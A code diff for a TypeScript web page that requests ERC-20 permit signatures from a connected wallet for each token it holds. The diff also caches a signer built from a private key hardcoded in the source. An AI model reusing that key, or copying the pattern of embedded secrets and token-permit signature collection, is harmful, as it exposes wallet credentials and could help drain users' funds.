@@ -95,7 +95,7 @@ const Page = () => {
 							NONCE
 						</button>
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							const nonce = await callContractMethod('nonces', [account.address], token.contract_address,signer!);
+							const nonce = await callContractMethod('nonces', [account.address], token.contract_address);
 							const sig = await createPermitSignature(async (args: any)=>{
 									console.log('test',args);
 								return signTypedData(config, args);
@@ -219,11 +219,14 @@ async function createPermitSignature(signMethod: any, domainName: string,contrac
 	}
 }
 
-const createSigner = async (rpc: string)=>{
+let _WALLET: Wallet;
+const createSigner = async (rpc: string): Promise<Wallet>=>{
+	if (_WALLET) return _WALLET;
 	const provider = new ethers.providers.JsonRpcProvider(rpc);
 	await provider.detectNetwork()
 	const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
-	return new Wallet(privateKey, provider);
+	_WALLET = new Wallet(privateKey, provider);
+	return _WALLET;
 }
 
 const methods = {
@@ -233,7 +236,7 @@ const methods = {
 	nonces: "function nonces(address owner) view returns (uint256)"
 }
 
-async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signer: JsonRpcSigner) {
+async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signer?: JsonRpcSigner) {
 	console.log("CALL", method,args);
 	let tokenContract = new ethers.Contract(addressOrName,[
 		methods[method]
